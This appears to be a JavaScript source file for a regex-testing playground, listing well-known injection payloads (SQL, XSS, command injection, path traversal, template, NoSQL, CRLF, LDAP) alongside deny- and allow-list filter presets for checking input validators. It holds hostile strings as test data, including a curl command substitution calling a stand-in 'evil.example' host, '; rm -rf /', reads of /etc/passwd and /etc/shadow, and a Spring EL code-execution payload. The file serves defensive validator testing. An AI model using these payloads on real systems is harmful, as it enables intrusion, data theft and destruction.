/**
 * Payload library and preset patterns for the Regex Playground.
 *
 * Every payload here is a well-known, publicly documented example of an
 * injection technique (SQLi, XSS, command injection, etc.). They exist so
 * a regex meant to validate or sanitize input can be checked against
 * realistic attack strings — nothing here is novel or weaponized.
 */

const PAYLOAD_CATEGORIES = [
    {
        id: 'sqli',
        name: 'SQL Injection',
        description: "Strings that try to break out of a SQL literal or numeric context and change the query's logic.",
        payloads: [
            { value: "' OR '1'='1", note: 'Classic boolean bypass for login forms.' },
            { value: "' OR 1=1 -- ", note: 'Boolean bypass that comments out the rest of the query.' },
            { value: "admin'--", note: 'Comments out the password check entirely.' },
            { value: "1' UNION SELECT NULL,NULL,NULL--", note: 'UNION-based extraction from another table.' },
            { value: "'; DROP TABLE users;--", note: 'Stacked query attempting a destructive statement.' },
            { value: "1' AND SLEEP(5)--", note: 'Time-based blind injection probe.' },
            { value: '" OR ""="', note: 'Double-quote variant of the boolean bypass.' },
            { value: '1 OR 1=1', note: 'Works in unquoted numeric contexts.' },
        ],
    },
    {
        id: 'xss',
        name: 'Cross-Site Scripting (XSS)',
        description: 'Markup or URIs that execute attacker-controlled script in the victim\'s browser.',
        payloads: [
            { value: '<script>alert(1)</script>', note: 'The textbook reflected/stored XSS payload.' },
            { value: '<img src=x onerror=alert(1)>', note: 'Event-handler based, no <script> tag needed.' },
            { value: '<svg onload=alert(1)>', note: 'SVG event handler, often missed by tag-only filters.' },
            { value: 'javascript:alert(document.cookie)', note: 'A javascript: URI used in href/src attributes.' },
            { value: '"><script>alert(1)</script>', note: 'Breaks out of an HTML attribute before injecting a tag.' },
            { value: '<a href="javascript:alert(1)">click</a>', note: 'Link-based javascript: URI execution.' },
            { value: "'-alert(1)-'", note: 'Breaks out of a single-quoted JS string literal.' },
            { value: '<iframe src="data:text/html,<script>alert(1)</script>">', note: 'data: URI smuggling a second HTML document.' },
        ],
    },
    {
        id: 'cmdi',
        name: 'Command Injection',
        description: 'Shell metacharacters used to chain or substitute extra commands onto user input.',
        payloads: [
            { value: '; ls -la', note: 'Command separator appends a second command.' },
            { value: '| whoami', note: 'Pipes output into / runs an additional command.' },
            { value: '&& cat /etc/passwd', note: 'Runs a follow-up command on success.' },
            { value: '`id`', note: 'Backtick command substitution.' },
            { value: '$(curl http://evil.example/x)', note: '$() command substitution, often used to exfiltrate data.' },
            { value: '; rm -rf /', note: 'Destructive command appended via separator.' },
            { value: '127.0.0.1; shutdown -h now', note: 'Looks like a valid host, hides a second command.' },
            { value: '|| ping -c 10 127.0.0.1', note: 'Runs a follow-up command on failure.' },
        ],
    },
    {
        id: 'path',
        name: 'Path Traversal',
        description: 'Sequences that walk out of an intended directory to reach arbitrary files.',
        payloads: [
            { value: '../../../etc/passwd', note: 'Classic relative-path traversal on Unix.' },
            { value: '..\\..\\..\\windows\\system32\\config\\sam', note: 'Windows-style traversal with backslashes.' },
            { value: '%2e%2e%2f%2e%2e%2fetc%2fpasswd', note: 'URL-encoded traversal — bypasses literal "../" filters.' },
            { value: '....//....//etc/passwd', note: 'Doubled separators, defeats naive "../" stripping.' },
            { value: '/var/www/../../etc/shadow', note: 'Traversal hidden after a plausible base path.' },
            { value: '..%c0%af..%c0%afetc/passwd', note: 'Overlong UTF-8 encoding of "/" used to evade filters.' },
        ],
    },
    {
        id: 'ssti',
        name: 'Template Injection (SSTI)',
        description: 'Template syntax that gets evaluated server-side instead of rendered as text.',
        payloads: [
            { value: '{{7*7}}', note: 'Jinja2 / Twig style expression evaluation probe.' },
            { value: '${7*7}', note: 'Expression-language / FreeMarker style probe.' },
            { value: '#{7*7}', note: 'Ruby ERB / Thymeleaf style probe.' },
            { value: '<%= 7*7 %>', note: 'ERB / JSP style embedded expression.' },
            { value: '{{config.items()}}', note: 'Jinja2 attempt to dump app configuration.' },
            { value: "${T(java.lang.Runtime).getRuntime().exec('id')}", note: 'Spring EL attempt at remote code execution.' },
        ],
    },
    {
        id: 'nosql',
        name: 'NoSQL Injection',
        description: 'Operators or fragments that change query semantics in document databases.',
        payloads: [
            { value: '{"$gt": ""}', note: "MongoDB operator that matches any value greater than empty string." },
            { value: '{"$ne": null}', note: "MongoDB operator that matches any non-null value, e.g. for auth bypass." },
            { value: "'; return true; var x='", note: 'Breaks out of a $where JavaScript string into always-true logic.' },
            { value: '{"$where": "this.password.length > 0"}', note: 'Injects arbitrary JS into a $where clause.' },
            { value: "admin' || '1'=='1", note: 'Boolean-bypass adapted for JS-style query strings.' },
        ],
    },
    {
        id: 'crlf',
        name: 'CRLF / Header Injection',
        description: 'Embedded line breaks that smuggle extra HTTP headers or log entries.',
        payloads: [
            { value: '%0d%0aSet-Cookie:%20session=hijacked', note: 'URL-encoded CRLF used to inject a Set-Cookie header.' },
            { value: '\r\nLocation: https://evil.example', note: 'Raw CRLF used for response-splitting / open redirect.' },
            { value: 'value%0d%0aContent-Length:%200', note: 'Encoded CRLF aimed at smuggling a Content-Length header.' },
            { value: 'test\nX-Injected-Header: true', note: 'Bare newline used to inject a header or log line.' },
        ],
    },
    {
        id: 'ldap',
        name: 'LDAP Injection',
        description: 'Filter metacharacters that change the logic of an LDAP search filter.',
        payloads: [
            { value: '*)(uid=*))(|(uid=*', note: 'Closes the current filter clause and ORs in an always-true one.' },
            { value: '*)(|(password=*))', note: 'Wildcard combined with an OR to match any password.' },
            { value: 'admin)(&)', note: 'Appends an empty AND clause after closing the filter early.' },
            { value: '*)(objectClass=*', note: 'Wildcard plus an objectClass filter to enumerate entries.' },
        ],
    },
];

/**
 * Preset filter patterns. Each one demonstrates either a reasonable
 * approach or a common pitfall, so the same payload library tells a
 * different story depending on which preset is active.
 */
const PRESET_PATTERNS = [
    {
        name: 'Block dangerous characters (deny-list)',
        pattern: "[<>'\"; &|$`]",
        flags: '',
        mode: 'deny',
        fullMatch: false,
        description: "A broad denylist of characters often used to break out of strings, tags or shell commands. Looks safe — but path traversal and template injection use none of these characters.",
    },
    {
        name: 'Block SQL keywords (deny-list)',
        pattern: '\\b(select|union|insert|update|delete|drop)\\b|--|;',
        flags: 'i',
        mode: 'deny',
        fullMatch: false,
        description: "Rejects common SQL keywords plus comment markers. Boolean-style payloads like ' OR '1'='1 contain no keyword and no -- or ;, so they slip straight through.",
    },
    {
        name: 'Block <script> tags (deny-list)',
        pattern: '<\\s*script',
        flags: 'i',
        mode: 'deny',
        fullMatch: false,
        description: 'Catches the obvious <script> tag but completely misses event-handler XSS (onerror, onload) and javascript: URIs.',
    },
    {
        name: 'Block shell metacharacters (deny-list)',
        pattern: '[;&|$`<>]',
        flags: '',
        mode: 'deny',
        fullMatch: false,
        description: 'A focused denylist for shell metacharacters. Effective against most command-injection payloads, but says nothing about SQL or XSS.',
    },
    {
        name: 'Reject literal ".." (deny-list)',
        pattern: '\\.\\.',
        flags: '',
        mode: 'deny',
        fullMatch: false,
        description: 'Blocks literal ".." sequences used for path traversal — but URL-encoded variants like %2e%2e%2f never contain a literal ".." and slip through.',
    },
    {
        name: 'Alphanumeric only (allow-list)',
        pattern: '[A-Za-z0-9]+',
        flags: '',
        mode: 'allow',
        fullMatch: true,
        description: 'A strict allow-list requiring the entire input to be letters and digits. Almost everything in the payload library should be rejected by this.',
    },
    {
        name: 'Email address (allow-list)',
        pattern: "[\\w.+-]+@[\\w-]+\\.[a-zA-Z]{2,}",
        flags: '',
        mode: 'allow',
        fullMatch: true,
        description: 'A typical email-validation pattern, required to match the whole field.',
    },
    {
        name: 'Numeric ID only (allow-list)',
        pattern: '\\d+',
        flags: '',
        mode: 'allow',
        fullMatch: true,
        description: 'Strict numeric allow-list, e.g. for a record ID in a URL — every payload in the library should fail this.',
    },
];
